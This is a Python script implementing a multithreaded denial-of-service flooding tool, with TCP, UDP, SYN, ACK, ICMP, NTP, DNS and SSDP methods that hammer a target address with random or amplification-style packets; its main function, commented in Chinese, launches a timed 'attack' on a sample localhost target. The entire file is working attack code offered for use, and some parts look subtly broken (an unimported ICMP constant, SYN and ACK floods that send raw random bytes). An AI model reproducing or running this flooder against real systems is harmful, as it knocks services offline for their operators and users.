from concurrent.futures import ThreadPoolExecutor
from contextlib import suppress
from itertools import cycle
from multiprocessing import RawValue
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice
from socket import (AF_INET, SOCK_DGRAM, SOCK_RAW, SOCK_STREAM, IPPROTO_UDP, IPPROTO_TCP, IPPROTO_IP, gethostbyname, socket)
from struct import pack as data_pack
from threading import Event, Thread
from time import sleep, time
from typing import List, Set, Tuple
from uuid import uuid4

class Methods:
    LAYER4_METHODS: Set[str] = {"TCP", "UDP", "SYN", "ACK", "ICMP", "NTP", "DNS", "SSDP"}

class Counter:
    def __init__(self, value=0):
        self._value = RawValue('i', value)

    def __iadd__(self, value):
        self._value.value += value
        return self

    def __int__(self):
        return self._value.value

    def set(self, value):
        self._value.value = value
        return self

REQUESTS_SENT = Counter()
BYTES_SEND = Counter()

class Layer4(Thread):
    _method: str
    _target: Tuple[str, int]
    SENT_FLOOD: any

    def __init__(self, target: Tuple[str, int], method: str = "TCP", synevent: Event = None):
        Thread.__init__(self, daemon=True)
        self._method = method
        self._target = target
        self._synevent = synevent
        self.methods = {
            "TCP": self.TCP,
            "UDP": self.UDP,
            "SYN": self.SYN,
            "ACK": self.ACK,
            "ICMP": self.ICMP,
            "NTP": self.NTP,
            "DNS": self.DNS,
            "SSDP": self.SSDP,
        }
        self.SENT_FLOOD = self.methods.get(self._method, self.default_method)

    def run(self) -> None:
        if self._synevent: self._synevent.wait()
        while self._synevent.is_set():
            if self.SENT_FLOOD:
                self.SENT_FLOOD()

    def default_method(self) -> None:
        print(f"Method {self._method} not implemented.")

    def open_connection(self, conn_type=AF_INET, sock_type=SOCK_STREAM, proto_type=IPPROTO_TCP):
        s = socket(conn_type, sock_type, proto_type)
        s.setsockopt(IPPROTO_TCP, 1, 1)
        s.settimeout(.9)
        s.connect(self._target)
        return s

    def TCP(self) -> None:
        s = None
        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
            while self.send(s, randbytes(1024)):
                continue
        self.safe_close(s)

    def UDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            while self.sendto(s, randbytes(1024), self._target):
                continue
        self.safe_close(s)

    def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, 3, 1)
            while self.sendto(s, randbytes(1024), self._target):
                continue
        self.safe_close(s)

    def ACK(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, 3, 1)
            while self.sendto(s, randbytes(1024), self._target):
                continue
        self.safe_close(s)

    def ICMP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_ICMP) as s:
            while self.sendto(s, randbytes(1024), self._target):
                continue
        self.safe_close(s)

    def NTP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = data_pack('!B', 0x1b) + (47 * b'\0')
            while self.sendto(s, payload, self._target):
                continue
        self.safe_close(s)

    def DNS(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + randbytes(12)
            while self.sendto(s, payload, self._target):
                continue
        self.safe_close(s)

    def SSDP(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_DGRAM) as s:
            payload = ("M-SEARCH * HTTP/1.1\r\n" "HOST:239.255.255.250:1900\r\n" "MAN:\"ssdp:discover\"\r\n" "MX:2\r\n" "ST:ssdp:all\r\n" "\r\n").encode()
            while self.sendto(s, payload, self._target):
                continue
        self.safe_close(s)

    @staticmethod
    def send(sock: socket, packet: bytes):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.send(packet):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def sendto(sock, packet, target):
        global BYTES_SEND, REQUESTS_SENT
        if not sock.sendto(packet, target):
            return False
        BYTES_SEND += len(packet)
        REQUESTS_SENT += 1
        return True

    @staticmethod
    def safe_close(sock=None):
        if sock:
            sock.close()

def main():
    target = ("127.0.0.1", 80)  # 示例目标IP和端口
    method = "TCP"  # 攻击方法
    threads = 10  # 线程数
    duration = 60  # 攻击持续时间（秒）

    event = Event()
    event.clear()

    for _ in range(threads):
        Layer4(target, method, event).start()

    print(f"Starting attack on {target[0]}:{target[1]} using method {method} for {duration} seconds with {threads} threads.")
    event.set()
    ts = time()
    while time() < ts + duration:
        sleep(1)

    event.clear()
    print("Attack finished.")

if __name__ == "__main__":
    main()
